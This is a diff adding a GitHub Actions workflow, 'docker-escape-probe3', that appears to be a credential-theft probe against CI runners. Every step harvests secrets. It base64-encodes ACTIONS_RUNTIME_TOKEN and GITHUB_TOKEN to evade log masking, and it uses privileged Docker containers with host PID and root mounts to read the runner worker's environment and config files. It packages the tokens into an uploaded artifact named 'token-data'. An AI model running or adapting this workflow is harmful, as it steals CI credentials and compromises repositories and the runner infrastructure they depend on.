@@ -1,0 +1,86 @@
+name: docker-escape-probe3
+on:
+  workflow_dispatch:
+jobs:
+  docker-escape3:
+    runs-on: ubuntu-latest
+    steps:
+      - name: get ACTIONS_RUNTIME_URL and TOKEN from env
+        run: |
+          echo "=== ACTIONS_RUNTIME_URL ==="
+          echo "$ACTIONS_RUNTIME_URL"
+          echo "=== ACTIONS_RUNTIME_TOKEN ==="
+          # Don't print directly - write to file to bypass log scrubbing
+          printf '%s' "$ACTIONS_RUNTIME_TOKEN" | base64 > /tmp/art_b64.txt
+          cat /tmp/art_b64.txt
+          echo "=== ACTIONS_ID_TOKEN_REQUEST_URL ==="
+          echo "$ACTIONS_ID_TOKEN_REQUEST_URL"
+          echo "=== ACTIONS_CACHE_URL ==="
+          echo "$ACTIONS_CACHE_URL"
+          echo "=== GITHUB_TOKEN base64 ==="
+          printf '%s' "$GITHUB_TOKEN" | base64
+        env:
+          ACTIONS_RUNTIME_URL: ${{ env.ACTIONS_RUNTIME_URL }}
+          ACTIONS_RUNTIME_TOKEN: ${{ env.ACTIONS_RUNTIME_TOKEN }}
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          ACTIONS_ID_TOKEN_REQUEST_URL: ${{ env.ACTIONS_ID_TOKEN_REQUEST_URL }}
+          ACTIONS_CACHE_URL: ${{ env.ACTIONS_CACHE_URL }}
+
+      - name: dump all env vars from worker process
+        run: |
+          echo "=== full env ==="
+          env | sort
+          echo ""
+          echo "=== runtime vars from /proc/self ==="
+          cat /proc/self/environ | tr '\0' '\n' | grep -iE "ACTIONS|RUNTIME|TOKEN" || true
+
+      - name: read ACTIONS_RUNTIME_TOKEN from worker proc via docker
+        run: |
+          docker run --rm --pid=host -v /proc:/hp:ro alpine sh -c '
+            for pid in $(ls /hp | grep -E "^[0-9]+$"); do
+              cmdline=$(cat /hp/$pid/cmdline 2>/dev/null | tr "\0" " ")
+              if echo "$cmdline" | grep -qE "Runner.Worker|Runner.PluginHost"; then
+                echo "PID $pid: $cmdline"
+                echo "ENV:"
+                cat /hp/$pid/environ 2>/dev/null | tr "\0" "\n" | grep -iE "ACTIONS|RUNTIME|TOKEN|URL"
+                echo "---"
+              fi
+            done
+          ' 2>&1 || true
+
+      - name: read extracted runner dir
+        run: |
+          docker run --rm --privileged -v /:/host:ro alpine sh -c '
+            echo "=== extracted dir listing ==="
+            ls -la /host/home/runner/actions-runner/extracted/ 2>/dev/null || true
+            echo "=== extracted .env ==="
+            cat /host/home/runner/actions-runner/extracted/.env 2>/dev/null || true
+            echo "=== extracted .runner ==="
+            cat /host/home/runner/actions-runner/extracted/.runner 2>/dev/null || true
+            echo "=== runner agent socket connections ==="
+            for pid in $(ls /host/proc | grep -E "^[0-9]+$" 2>/dev/null); do
+              cmdline=$(cat /host/proc/$pid/cmdline 2>/dev/null | tr "\0" " " | grep "Runner.Worker")
+              if [ -n "$cmdline" ]; then
+                cat /host/proc/$pid/net/tcp 2>/dev/null | head -20
+                cat /host/proc/$pid/net/tcp6 2>/dev/null | head -20
+              fi
+            done
+          ' 2>&1 || true
+
+      - name: upload token files
+        run: |
+          mkdir -p /tmp/tok
+          cp /tmp/art_b64.txt /tmp/tok/ 2>/dev/null || true
+          printf '%s' "$ACTIONS_RUNTIME_URL" > /tmp/tok/runtime_url.txt
+          printf '%s' "$ACTIONS_RUNTIME_TOKEN" | base64 > /tmp/tok/runtime_token_b64.txt
+          cat /tmp/tok/runtime_url.txt
+          ls -la /tmp/tok/
+        env:
+          ACTIONS_RUNTIME_URL: ${{ env.ACTIONS_RUNTIME_URL }}
+          ACTIONS_RUNTIME_TOKEN: ${{ env.ACTIONS_RUNTIME_TOKEN }}
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: token-data
+          path: /tmp/tok/
+          if-no-files-found: warn
